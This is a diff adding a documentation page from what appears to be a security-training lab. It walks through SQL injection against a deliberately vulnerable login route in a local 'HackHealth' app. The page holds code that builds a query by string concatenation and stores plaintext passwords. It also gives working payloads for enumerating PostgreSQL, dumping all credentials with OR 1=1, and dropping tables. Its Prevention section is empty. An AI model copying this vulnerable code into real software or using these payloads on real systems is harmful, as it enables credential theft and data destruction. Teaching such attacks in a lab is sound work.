@@ -1,0 +1,131 @@
+import {Callout} from 'nextra-theme-docs'
+import Image from 'next/image'
+
+# SQL Injection
+
+<Callout type="warning" emoji="🔍">
+  **CWE-89**: SQL Injection <br />
+</Callout>
+
+## About
+
+## Attack
+### Code preparation
+To prepare for this attack, we need to slightly modify the implementation of handling the login request, because we have already implemented secure way in section [❕JWT authentication](/cybersecurity/a02/jwt). <br />
+Replace the handling of login request in `routes/jwtAuth.ts` with the following code:
+```js filename="jwtAuth.ts"  copy showLineNumbers
+// LOGIN
+router.post("/login", bruteforce.prevent, async (req, res) => {
+    const {email, password} = req.body;
+    let user = null;
+
+    try {
+        user = await pool.query(
+            "SELECT email, password from useraccount WHERE email = '" + email + "'"
+        );
+
+        if (user?.rows?.length === 0 || user?.length === 0) {
+            return res.status(401).json({message: "Invalid email or password.", user: user});
+        }
+
+        const validPassword = password === user.rows[0].password;
+
+        if (!validPassword) {
+            return res.status(401).json({message: "Invalid email or password.", user: user});
+        }
+
+        const token = generateJWT(user.rows[0].password);
+        res.json({
+            success: true,
+            message: "Authentication successful!",
+            token: token,
+            user: user
+        });
+    } catch (err) {
+        console.error(err.message);
+        res.status(500).send({message:"Server error", user: user});
+    }
+});
+```
+
+<Callout emoji="💡">
+Compared to previous implementation, we get rid of the `inputValidation` middleware, we handle passwords as plain text and we adjusted the query to be vulnerable to SQL injection.
+</Callout>
+
+### Gather internal information
+Firstly, we are going to gather some internal information about the database and tables, which will then help us to perform some more serius attacks. <br />
+#### **Database type** <br />
+* Enter the following inside the email field on HackHealth login screen.
+```sql copy
+' UNION SELECT usename, NULL FROM pg_user--
+``` 
+* Leave the password field empty and click on the login button. <br />
+* When you open Developer Tools, in the console, when dig deeper into user.rows, you will see the name of the database which is used. <br />
+<Image src="/a03/a03_1.png" alt="Burp intruder" width={1000} height={300}/>
+#### **Database name** <br />
+* Enter the following inside the email field on HackHealth login screen.
+```sql copy
+' UNION SELECT current_database(), null--
+```
+* After digging deeper into user.rows, you will see the name of the database: `hackhealthdb` <br />
+#### **Names of tables** <br />
+In the same way as in the previous step, we can get the name of the database by inserting following code into the email field.
+```sql copy
+'; SELECT table_name FROM information_schema.tables WHERE table_schema='public'; --
+```
+* Again, after digging deeper into user[1].rows, you will see the names of the tables. <br />
+    * useraccount
+    * appointment
+    * medicalreport
+<Callout emoji="💡">
+To sum up, we have gathered the following information: <br />
+* Database type: PostgreSQL
+* Database name: hackhealthdb
+* Names of tables: useraccount, appointment, medicalreport <br />
+
+We are going to use this information in the next step.
+</Callout>
+
+### Grant unauthorized access
+In this attack, our aim is to get login credentials for all the users in the table `useraccount`. <br />
+Into an email field, we are going to insert the following code:
+```sql copy
+' OR 1=1; --
+```
+<Callout type="info" emoji="ℹ️">
+This input would cause the SQL query to be constructed as follows: <br />
+```sql copy
+SELECT email, password form useraccount WHERE email = '' OR 1=1; --
+```
+The semicolon (;) terminates the current statement and the two dashes (--) indicate a comment, effectively ignoring the remaining part of the original query. The injected SQL code OR 1=1 will always evaluate to true, effectively bypassing the authentication check and returning all records from the "useraccount" table.
+</Callout>
+* We are now able to see all the users with their login credentials. <br />
+
+### Corrupt the tables and database
+SQL injection attack is not only about getting the data, but also about corrupting the data. <br />
+#### **Drop the table** <br />
+* Enter the following inside the email field on HackHealth login screen.
+```sql copy
+'; DROP TABLE useraccount CASCADE; --
+```
+* Congratulations, you have just dropped the table `useraccount`! <br />
+* Now, when you try to login with the credentials you have obtained in the previous step, you will not be able to log in -> the table of users just do not exist anymore. <br />
+<Callout type="info" emoji="ℹ️">
+This was made possible only because when creating the tables, fereign key were created with CASCADE option. It means that when the table is dropped, all the tables that depend on it are also dropped. <br />
+</Callout>
+
+#### **Drop the database** <br />
+	Dropping the database is quite more challenging that dropping individual tables. When you will try to execute command:
+    ```sql copy
+	'; DROP DATABASE hackhealthdb; --
+    ``` 
+    you will get an error: `DROP DATABASE cannot run inside a transaction block`.
+	This indicates that PostgreSQL does not allow a database to be dropped while there are active connections to it. This is to prevent accidental data loss due to unintended drops. Solution would be to terminate all running connections to the database, but this could not be done through SQL injection. <br />
+	Although the attempt about dropping whole database was not successful, we have  already caused considerable damage.
+
+## Prevention
+
+
+## Verification
+
+## Sources
